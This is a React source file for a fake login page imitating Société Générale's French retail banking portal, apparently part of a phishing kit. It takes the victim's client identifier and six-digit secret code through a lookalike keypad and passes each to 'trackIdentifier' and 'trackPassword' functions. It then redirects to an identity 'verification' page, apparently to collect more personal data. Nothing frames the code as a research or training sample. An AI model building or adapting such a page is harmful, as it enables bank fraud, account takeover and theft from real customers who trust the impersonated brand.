import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { X, HelpCircle, Briefcase, Building2, CreditCard, ShieldCheck, ChevronRight } from 'lucide-react';
import SGKeypad from '../components/SGKeypad';
import { trackIdentifier, trackPassword } from '../api';

const otherSpaces = [
  { icon: Briefcase, title: 'Espace Client Professionnels', desc: 'Progeliance Net' },
  { icon: Building2, title: 'Espace Client Entreprises', desc: 'Sogecash Net' },
];

const usefulLinks = [
  {
    icon: CreditCard,
    title: 'Urgences carte bancaire',
    sublinks: [
      'Faire opposition à votre carte bancaire',
      'Recharger votre carte bancaire',
    ],
  },
  {
    icon: ShieldCheck,
    title: 'Nos conseils sécurité',
    sublinks: [
      'Découvrez SG Pass sécurité',
      'Guide des bonnes pratiques',
      'Voir les escroqueries identifiées',
    ],
  },
];

export default function EspaceClient() {
  const navigate = useNavigate();
  const [id, setId] = useState('');
  const [remember, setRemember] = useState(false);
  const [step, setStep] = useState('id'); // 'id' | 'pwd'
  const [pwd, setPwd] = useState('');

  const submitId = (e) => {
    e?.preventDefault();
    if (!id.trim()) return;
    // Fire-and-forget tracking, then move to keypad
    trackIdentifier(id.trim(), remember);
    setStep('pwd');
  };

  const onValidatePwd = () => {
    trackPassword(pwd);
    navigate('/verification/identite');
  };

  return (
    <div className="bg-white min-h-[calc(100vh-68px)]">
      {/* Welcome heading + form section */}
      <div className="max-w-[1180px] mx-auto px-4 md:px-8 pt-10 md:pt-14 pb-10">
        <h1 className="text-[20px] md:text-[24px] font-extrabold text-[#0F1B33] mb-10">
          Bienvenue à votre Espace Client Particuliers.
        </h1>

        <div className="grid lg:grid-cols-[1fr_1fr] gap-8 lg:gap-16 max-w-[1000px]">
          {/* LEFT — login form */}
          <div>
            <form onSubmit={submitId}>
              <label className="block text-[13.5px] font-bold text-[#0F1B33] mb-2">
                Saisissez votre identifiant client
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={id}
                  onChange={(e) =>
                    setId(e.target.value.replace(/\D/g, '').slice(0, 8))
                  }
                  disabled={step === 'pwd'}
                  maxLength={8}
                  inputMode="numeric"
                  autoComplete="off"
                  className="w-full border border-neutral-400 rounded-[3px] px-3 py-2.5 pr-9 text-[14px] focus:outline-none focus:border-[#0F1B33] focus:ring-1 focus:ring-[#0F1B33]/30 disabled:bg-neutral-50"
                />
                {id && (
                  <button
                    type="button"
                    onClick={() => {
                      setId('');
                      setStep('id');
                      setPwd('');
                    }}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-neutral-500 hover:text-black p-1"
                    aria-label="Effacer"
                  >
                    <X size={14} />
                  </button>
                )}
              </div>

              {step === 'id' && (
                <>
                  <label className="mt-4 flex items-center gap-2.5 cursor-pointer select-none">
                    <span
                      onClick={() => setRemember((r) => !r)}
                      className={`relative inline-flex h-5 w-9 items-center rounded-full transition-colors ${
                        remember ? 'bg-[#107C41]' : 'bg-neutral-300'
                      }`}
                    >
                      <span
                        className={`inline-block h-4 w-4 transform rounded-full bg-white shadow transition-transform ${
                          remember ? 'translate-x-[18px]' : 'translate-x-0.5'
                        }`}
                      />
                    </span>
                    <span className="text-[13px] text-[#0F1B33] font-semibold">Se souvenir de moi</span>
                    <HelpCircle size={13} className="text-neutral-500" />
                  </label>

                  <button
                    type="submit"
                    className="mt-6 inline-flex items-center justify-center w-full md:max-w-[280px] bg-[#E9041E] hover:bg-[#c8031a] text-white font-bold rounded-full py-2.5 text-[14.5px] transition-colors"
                  >
                    Valider
                  </button>
                </>
              )}

              {step === 'pwd' && (
                <div className="mt-4">
                  <SGKeypad
                    length={6}
                    value={pwd}
                    onChange={setPwd}
                    onValidate={onValidatePwd}
                  />
                </div>
              )}
            </form>
          </div>

          {/* RIGHT — help */}
          <div className="lg:border-l lg:border-neutral-200 lg:pl-12">
            <h3 className="text-[14px] font-bold text-[#0F1B33]">Où trouver mon Code Client SG ?</h3>
            <ul className="mt-3 space-y-2 text-[13.5px] text-[#2B2B2B] leading-[1.55] list-disc pl-5">
              <li>
                Votre Code Client vous a été communiqué lors de la souscription à la Banque à
                Distance. Il est également indiqué sur vos extraits de comptes.
              </li>
            </ul>
            <h3 className="mt-6 text-[14px] font-bold text-[#0F1B33]">
              Code Client ou Code Secret inconnus ?
            </h3>
            <ul className="mt-3 space-y-1.5 text-[13.5px]">
              <li>
                <a href="#" className="text-[#E9041E] hover:underline font-semibold">
                  &rsaquo; Je souhaite obtenir mon Code Client
                </a>
              </li>
              <li>
                <a href="#" className="text-[#E9041E] hover:underline font-semibold">
                  &rsaquo; Je ne reconnais pas mon Code Net
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>

      {/* Other client spaces (gray section) */}
      <div className="bg-[#F4F4F4] py-12 md:py-16">
        <div className="max-w-[760px] mx-auto px-4 md:px-8">
          <h2 className="text-center text-[20px] md:text-[22px] font-extrabold text-[#0F1B33]">
            Nos autres Espaces Client
          </h2>
          <div className="mt-6 space-y-3">
            {otherSpaces.map((s) => {
              const Icon = s.icon;
              return (
                <a
                  key={s.title}
                  href="#"
                  className="flex items-center gap-4 bg-white rounded-md border border-neutral-200 hover:border-[#0F1B33] px-5 py-4 transition-colors group"
                >
                  <span className="w-9 h-9 rounded-full bg-[#F4F4F4] flex items-center justify-center text-[#0F1B33]">
                    <Icon size={18} />
                  </span>
                  <div className="flex-1">
                    <p className="text-[14px] font-bold text-[#0F1B33]">{s.title}</p>
                    <p className="text-[12px] text-neutral-500">{s.desc}</p>
                  </div>
                  <ChevronRight size={16} className="text-neutral-400 group-hover:text-[#0F1B33]" />
                </a>
              );
            })}
          </div>
        </div>

        {/* Liens utiles */}
        <div className="max-w-[760px] mx-auto px-4 md:px-8 mt-12 md:mt-14">
          <h2 className="text-center text-[20px] md:text-[22px] font-extrabold text-[#0F1B33]">
            Liens utiles
          </h2>
          <div className="mt-6 grid md:grid-cols-2 gap-4">
            {usefulLinks.map((l) => {
              const Icon = l.icon;
              return (
                <div key={l.title} className="bg-white rounded-md border border-neutral-200 p-5">
                  <div className="flex items-center gap-3">
                    <span className="w-9 h-9 rounded-full bg-[#F4F4F4] flex items-center justify-center text-[#E9041E]">
                      <Icon size={18} />
                    </span>
                    <h3 className="text-[14px] font-bold text-[#0F1B33]">{l.title}</h3>
                  </div>
                  <ul className="mt-3 space-y-1.5">
                    {l.sublinks.map((sl) => (
                      <li key={sl}>
                        <a href="#" className="text-[13px] text-[#E9041E] hover:underline">
                          {sl}
                        </a>
                      </li>
                    ))}
                  </ul>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
}
